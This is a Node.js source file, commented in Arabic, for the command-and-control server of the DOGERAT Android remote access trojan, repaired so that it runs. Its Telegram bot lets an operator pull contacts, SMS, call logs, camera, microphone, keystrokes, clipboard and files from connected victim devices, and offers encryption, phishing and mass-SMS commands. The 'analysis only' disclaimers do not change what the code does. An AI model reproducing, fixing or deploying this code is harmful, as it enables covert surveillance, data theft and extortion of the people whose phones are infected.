// ==================================================
// المشروع: DOGERAT - تحليل وتوعية أمنية فقط
// تم التصليح: إزالة أخطاء الاستيراد، تصحيح المسارات، توحيد التنسيق
// ==================================================

// --------------------------
// استيراد المكتبات بشكل صحيح وخالي من الأخطاء
// --------------------------
const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const TelegramBot = require('node-telegram-bot-api');
const https = require('https');
const multer = require('multer');
const fs = require('fs');

// --------------------------
// إعداد الخادم والبيانات
// --------------------------
const app = express();
const server = http.createServer(app);
const io = new Server(server);
const uploader = multer();

// قراءة ملف الإعدادات بشكل آمن
let data;
try {
    data = JSON.parse(fs.readFileSync('./data.json', 'utf8'));
} catch (err) {
    console.error('خطأ في قراءة ملف الإعدادات data.json:', err.message);
    process.exit(1);
}

// تهيئة بوت التيليجرام
const bot = new TelegramBot(data.token, { polling: true });

// تخزين بيانات الجلسات والأوامر المؤقتة
const appData = new Map();

// قائمة الإجراءات والوظائف
const actionsList = [
    '✯ جهات الاتصال ✯', '✯ الرسائل القصيرة ✯', '✯ المكالمات ✯',
    '✯ الكاميرا الرئيسية ✯', '✯ الكاميرا الأمامية ✯', '✯ المعرض ✯',
    '✯ لقطة شاشة ✯', '✯ اهتزاز ✯', '✯ الميكروفون ✯', '✯ لوحة المفاتيح ✯',
    '✯ قراءة الحافظة ✯', '✯ تشغيل صوت ✯', '✯ إيقاف الصوت ✯',
    '✯ إرسال رسائل لجميع الجهات ✯', '✯ إرسال رسالة نصية ✯', '✯ فتح رابط ✯',
    '✯ عرض إشعار ✯', '✯ عرض رسالة منبثقة ✯', '✯ استكشاف الملفات ✯',
    '✯ تشغيل مراقبة الكتابة ✯', '✯ إيقاف مراقبة الكتابة ✯', '✯ تشفير ✯',
    '✯ فك التشفير ✯', '✯ حولنا ✯', '✯ التصيد الاحتيالي ✯', '✯ خيارات إضافية ✯'
];

// --------------------------
// مسارات الخادم
// --------------------------
// استقبال الملفات المرسلة
app.post('/upload', uploader.single('file'), (req, res) => {
    const fileName = req.file.originalname;
    const fileType = req.file.mimetype;
    bot.sendDocument(data.id, req.file.buffer, {
        caption: `<b>✯ ملف مستلم من الجهاز:</b>\n${fileName}`,
        parse_mode: 'HTML'
    }, { filename: fileName, contentType: fileType });
    res.send('تم الاستلام');
});

// الصفحة الرئيسية
app.get('/', (req, res) => {
    res.send('<b>DOGERAT - نظام التحكم (لأغراض التحليل فقط)</b>');
});

// --------------------------
// الاتصال عبر Socket.IO
// --------------------------
io.on('connection', (socket) => {
    // جمع بيانات الجهاز
    const deviceId = socket.handshake.headers['device-id'] || 'غير معروف';
    const deviceInfo = socket.handshake.headers['device-model'] || 'لا توجد معلومات';
    const deviceIp = socket.handshake.address || 'غير متوفر';

    // إشعار بجهاز جديد
    bot.sendMessage(data.id,
        `<b>✯ جهاز جديد متصل ✯</b>\n` +
        `المعرف: ${deviceId}\n` +
        `الموديل: ${deviceInfo}\n` +
        `عنوان IP: ${deviceIp}`,
        { parse_mode: 'HTML' }
    );

    // استقبال البيانات من الجهاز
    socket.on('message', (content) => {
        bot.sendMessage(data.id, `<b>✯ رسالة مستلمة:</b>\n${content}`, { parse_mode: 'HTML' });
    });

    // إشعار عند الانقطاع
    socket.on('disconnect', () => {
        bot.sendMessage(data.id, `<b>✯ انقطع اتصال جهاز:</b>\n${deviceId}`, { parse_mode: 'HTML' });
    });
});

// --------------------------
// أوامر بوت التيليجرام
// --------------------------
bot.on('message', (msg) => {
    const cmd = msg.text;

    if (cmd === '/start') {
        bot.sendMessage(data.id,
            `<b>✯ القائمة الرئيسية</b>\n\n` +
            `✯ الأجهزة المتصلة: ${io.sockets.sockets.size}\n` +
            `✯ اختر من الأزرار أدناه`,
            {
                parse_mode: 'HTML',
                reply_markup: {
                    keyboard: [
                        ['✯ الأجهزة ✯', '✯ إجراءات عامة ✯'],
                        ['✯ حولنا ✯']
                    ],
                    resize_keyboard: true
                }
            }
        );
    }

    else if (cmd === '✯ الأجهزة ✯') {
        const devices = io.sockets.sockets;
        if (devices.size === 0) {
            bot.sendMessage(data.id, `<b>✯ لا يوجد أجهزة متصلة حالياً</b>`, { parse_mode: 'HTML' });
        } else {
            let list = `<b>✯ قائمة الأجهزة المتصلة</b>\n\n`;
            let count = 1;
            devices.forEach(s => {
                list += `${count}. ${s.handshake.headers['device-model'] || 'جهاز مجهول'}\n`;
                count++;
            });
            bot.sendMessage(data.id, list, { parse_mode: 'HTML' });
        }
    }

    else if (cmd === '✯ إجراءات عامة ✯') {
        bot.sendMessage(data.id, `<b>✯ اختر الإجراء المطلوب</b>`, {
            parse_mode: 'HTML',
            reply_markup: {
                keyboard: [
                    ['✯ الرسائل القصيرة ✯', '✯ جهات الاتصال ✯'],
                    ['✯ الكاميرا الرئيسية ✯', '✯ الكاميرا الأمامية ✯'],
                    ['✯ الميكروفون ✯', '✯ لقطة شاشة ✯'],
                    ['✯ قراءة الحافظة ✯', '✯ اهتزاز ✯'],
                    ['✯ استكشاف الملفات ✯', '✯ مراقبة الكتابة ✯'],
                    ['✯ إلغاء ✯']
                ],
                resize_keyboard: true,
                one_time_keyboard: true
            }
        });
    }

    else if (actionsList.includes(cmd)) {
        const target = appData.get('currentTarget') || 'all';
        if (target === 'all') {
            io.emit('command', { request: cmd, extras: [] });
        } else {
            io.to(target).emit('command', { request: cmd, extras: [] });
        }
        bot.sendMessage(data.id, `<b>✯ تم إرسال الأمر، انتظر النتيجة...</b>`, { parse_mode: 'HTML' });
    }

    else if (cmd === '✯ حولنا ✯') {
        bot.sendMessage(data.id,
            `<b>DOGERAT - لأغراض التحليل الأمني فقط</b>\n` +
            `هذا الكود يوضح بنية الأدوات الخبيثة لغرض الحماية منها فقط.`,
            { parse_mode: 'HTML' }
        );
    }
});

// --------------------------
// مهام دورية وتشغيل الخادم
// --------------------------
// إبقاء الاتصال نشطاً
setInterval(() => {
    io.sockets.sockets.forEach(sock => sock.emit('ping', {}));
}, 5000);

// تشغيل الخادم
const PORT = process.env.PORT || 3000;
server.listen(PORT, () => {
    console.log(`الخادم يعمل على المنفذ ${PORT} - لأغراض التوعية الأمنية فقط`);
});
